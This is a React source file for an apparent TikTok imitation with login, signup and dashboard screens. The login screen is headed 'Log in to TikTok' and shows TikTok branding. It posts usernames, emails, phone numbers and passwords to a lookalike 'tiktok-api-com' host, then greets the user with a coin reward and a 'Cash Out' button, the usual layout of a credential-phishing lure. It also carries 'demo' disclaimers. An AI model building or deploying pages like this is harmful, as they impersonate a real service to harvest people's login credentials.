import { useState } from "react";
import logo from "./assets/tiktok-logo.png";
import "./App.css";

// ============================================================
// RAILWAY BACKEND
// ============================================================

const API_URL = "https://tiktok-api-com.up.railway.app";
function App() {
  // ============================================================
  // LOGIN STATES
  // ============================================================

  const [loginInput, setLoginInput] = useState("");
  const [loginPassword, setLoginPassword] = useState("");

  // ============================================================
  // SIGNUP STATES
  // ============================================================

  const [signupUsername, setSignupUsername] = useState("");
  const [signupEmail, setSignupEmail] = useState("");
  const [signupPhone, setSignupPhone] = useState("");
  const [signupPassword, setSignupPassword] = useState("");
  const [signupConfirmPassword, setSignupConfirmPassword] = useState("");

  // ============================================================
  // GENERAL APP STATES
  // ============================================================

  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);
  const [screen, setScreen] = useState("login");
  const [user, setUser] = useState(null);

  const [coins, setCoins] = useState(5000);

  // ============================================================
  // LOGIN
  // ============================================================

  const handleLogin = async (e) => {
    e.preventDefault();

    setMessage("");

    if (!loginInput.trim() || !loginPassword) {
      setMessage("Please enter your email/username/phone and password.");
      return;
    }

    try {
      setLoading(true);

      let response;

      const looksLikePhone = /^[0-9+\-\s()]+$/.test(loginInput.trim());

      // --------------------------------------------------------
      // PHONE LOGIN
      // --------------------------------------------------------

      if (looksLikePhone) {
        response = await fetch(`${API_URL}/api/login-phone`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            phone: loginInput.trim(),
            password: loginPassword,
          }),
        });
      }

      // --------------------------------------------------------
      // EMAIL / USERNAME LOGIN
      // --------------------------------------------------------
      else {
        response = await fetch(`${API_URL}/api/login`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            username: loginInput.trim(),
            password: loginPassword,
          }),
        });
      }

      // --------------------------------------------------------
      // READ SERVER RESPONSE
      // --------------------------------------------------------

      const data = await response.json();

      if (data.success) {
        // Save the logged-in user
        localStorage.setItem("user", JSON.stringify(data.user));

        // Save user in React
        setUser(data.user);

        // Get the actual coin balance from MySQL
        setCoins(data.user.coins ?? 5000);

        // Clear password
        setLoginPassword("");

        // Clear message
        setMessage("");

        // Go to dashboard
        setScreen("dashboard");
      } else {
        setMessage(data.message || "Invalid login information.");
      }
    } catch (error) {
      console.error("Login error:", error);

      setMessage("Cannot connect to the server. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  // ============================================================
  // SIGN UP
  // ============================================================

  const handleSignup = async (e) => {
    e.preventDefault();

    setMessage("");

    // ----------------------------------------------------------
    // VALIDATION
    // ----------------------------------------------------------

    if (!signupUsername.trim()) {
      setMessage("Username is required.");
      return;
    }

    if (!signupEmail.trim() && !signupPhone.trim()) {
      setMessage("Please enter an email or phone number.");
      return;
    }

    if (!signupPassword) {
      setMessage("Password is required.");
      return;
    }

    if (signupPassword.length < 6) {
      setMessage("Password must be at least 6 characters.");
      return;
    }

    if (signupPassword !== signupConfirmPassword) {
      setMessage("Passwords do not match.");
      return;
    }

    // ----------------------------------------------------------
    // SEND TO RAILWAY SERVER
    // ----------------------------------------------------------

    try {
      setLoading(true);

      const response = await fetch(`${API_URL}/api/signup`, {
        method: "POST",

        headers: {
          "Content-Type": "application/json",
        },

        body: JSON.stringify({
          username: signupUsername.trim(),

          email: signupEmail.trim() || null,

          phone: signupPhone.trim() || null,

          password: signupPassword,
        }),
      });

      const data = await response.json();

      if (data.success) {
        setMessage("Account created successfully! Please log in.");

        // Put username into login field
        setLoginInput(signupUsername.trim());

        // Clear signup form
        setSignupUsername("");
        setSignupEmail("");
        setSignupPhone("");
        setSignupPassword("");
        setSignupConfirmPassword("");

        // Go back to login
        setTimeout(() => {
          setScreen("login");
        }, 800);
      } else {
        setMessage(data.message || "Registration failed.");
      }
    } catch (error) {
      console.error("Signup error:", error);

      setMessage("Cannot connect to the server. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  // ============================================================
  // LOGOUT
  // ============================================================

  const handleLogout = () => {
    localStorage.removeItem("user");

    setUser(null);

    setLoginInput("");
    setLoginPassword("");

    setCoins(10000);

    setMessage("");

    setScreen("login");
  };

  // ============================================================
  // DEMO CASH OUT
  // ============================================================

  const handleCashOut = () => {
    alert(
      "Demo Cash Out\n\n" +
        "This is only a demonstration. " +
        "The 10,000 virtual coins have no real monetary value.",
    );
  };

  // ============================================================
  // SIGNUP PAGE
  // ============================================================

  if (screen === "signup") {
    return (
      <div className="tiktok-page">
        {/* HEADER */}

        <header className="header">
          <div className="logo">
            <img src={logo} alt="TikTok Clone" />
          </div>

          <div className="help">? &nbsp; Feedback and help</div>
        </header>

        {/* SIGNUP */}

        <main className="login-container">
          <h1>Create an account</h1>

          <p className="description">Create your TikTok Clone account.</p>

          <form onSubmit={handleSignup}>
            <input
              type="text"
              placeholder="Username"
              value={signupUsername}
              onChange={(e) => setSignupUsername(e.target.value)}
              required
            />

            <input
              type="email"
              placeholder="Email"
              value={signupEmail}
              onChange={(e) => setSignupEmail(e.target.value)}
            />

            <input
              type="tel"
              placeholder="Phone number (optional)"
              value={signupPhone}
              onChange={(e) => setSignupPhone(e.target.value)}
            />

            <input
              type="password"
              placeholder="Password"
              value={signupPassword}
              onChange={(e) => setSignupPassword(e.target.value)}
              required
            />

            <input
              type="password"
              placeholder="Confirm password"
              value={signupConfirmPassword}
              onChange={(e) => setSignupConfirmPassword(e.target.value)}
              required
            />

            <button className="login-button" type="submit" disabled={loading}>
              {loading ? "Creating account..." : "Sign up"}
            </button>
          </form>

          {message && <div className="message">{message}</div>}

          <button
            className="forgot"
            onClick={() => {
              setScreen("login");
              setMessage("");
            }}
          >
            Already have an account? Log in
          </button>
        </main>

        {/* FOOTER */}

        <footer className="footer">
          <div className="signup">
            Already have an account?
            <button
              onClick={() => {
                setScreen("login");
                setMessage("");
              }}
            >
              Log in
            </button>
          </div>

          <div className="footer-bottom">
            <button className="language">English (US)</button>

            <span>© 2026 TikTok Clone</span>
          </div>
        </footer>
      </div>
    );
  }

  // ============================================================
  // DASHBOARD
  // ============================================================

  if (screen === "dashboard") {
    return (
      <div className="dashboard-page">
        {/* HEADER */}

        <header className="dashboard-header">
          <div className="dashboard-logo">
            <img src={logo} alt="TikTok Clone" />
          </div>

          <div className="dashboard-header-right">
            <span className="help">? &nbsp; Feedback and help</span>

            <button className="logout-button" onClick={handleLogout}>
              Log out
            </button>
          </div>
        </header>

        {/* DASHBOARD CONTENT */}

        <main className="dashboard-content">
          <section className="welcome-section">
            <h1>
              Welcome
              {user?.username ? `, ${user.username}` : ""}!
            </h1>

            <p>
              Discover videos, follow creators, and enjoy your personalized
              experience.
            </p>
          </section>

          {/* REWARD CARD */}

          <section className="reward-card">
            <div className="reward-icon">🪙</div>

            <h2>Congratulations!</h2>

            <p className="reward-text">You received</p>

            <div className="coin-amount">{coins.toLocaleString()}</div>

            <p className="coin-label">Virtual Coins</p>

            <p className="demo-warning">
              Demo reward — these coins have no real monetary value.
            </p>

            <button className="cashout-button" onClick={handleCashOut}>
              Demo Cash Out
            </button>
          </section>

          {/* VIDEO CARDS */}

          <section className="video-section">
            <h2>For You</h2>

            <div className="video-grid">
              <div className="video-card">
                <div className="video-placeholder">▶</div>

                <h3>For You</h3>

                <p>Discover new videos</p>
              </div>

              <div className="video-card">
                <div className="video-placeholder">▶</div>

                <h3>Trending</h3>

                <p>See what's trending</p>
              </div>

              <div className="video-card">
                <div className="video-placeholder">▶</div>

                <h3>Following</h3>

                <p>Watch creators you follow</p>
              </div>
            </div>
          </section>
        </main>

        {/* BOTTOM NAVIGATION */}

        <nav className="bottom-nav">
          <button className="nav-item active">
            🏠
            <span>Home</span>
          </button>

          <button className="nav-item">
            🔍
            <span>Discover</span>
          </button>

          <button className="create-button">+</button>

          <button className="nav-item">
            💬
            <span>Inbox</span>
          </button>

          <button className="nav-item">
            👤
            <span>Profile</span>
          </button>
        </nav>
      </div>
    );
  }

  // ============================================================
  // LOGIN PAGE
  // ============================================================

  return (
    <div className="tiktok-page">
      {/* HEADER */}

      <header className="header">
        <div className="logo">
          <img src={logo} alt="TikTok Clone" />
        </div>

        <div className="help">? &nbsp; Feedback and help</div>
      </header>

      {/* LOGIN */}

      <main className="login-container">
        <h1>Log in to TikTok</h1>

        <p className="description">
          Manage your account, check notifications,
          <br />
          comment on videos, and more.
        </p>

        <form onSubmit={handleLogin}>
          <input
            type="text"
            placeholder="Email, username, or phone"
            value={loginInput}
            onChange={(e) => setLoginInput(e.target.value)}
            required
          />

          <input
            type="password"
            placeholder="Password"
            value={loginPassword}
            onChange={(e) => setLoginPassword(e.target.value)}
            required
          />

          <button className="login-button" type="submit" disabled={loading}>
            {loading ? "Logging in..." : "Log in"}
          </button>
        </form>

        <button
          className="forgot"
          onClick={() => setMessage("Password recovery is not configured yet.")}
        >
          Forgot password?
        </button>

        {message && <div className="message">{message}</div>}
      </main>

      {/* FOOTER */}

      <footer className="footer">
        <div className="signup">
          Don't have an account?
          <button
            onClick={() => {
              setScreen("signup");
              setMessage("");
            }}
          >
            Sign up
          </button>
        </div>

        <div className="footer-bottom">
          <button className="language">English (US)</button>

          <span>© 2026 TikTok Clone</span>
        </div>
      </footer>
    </div>
  );
}

export default App;
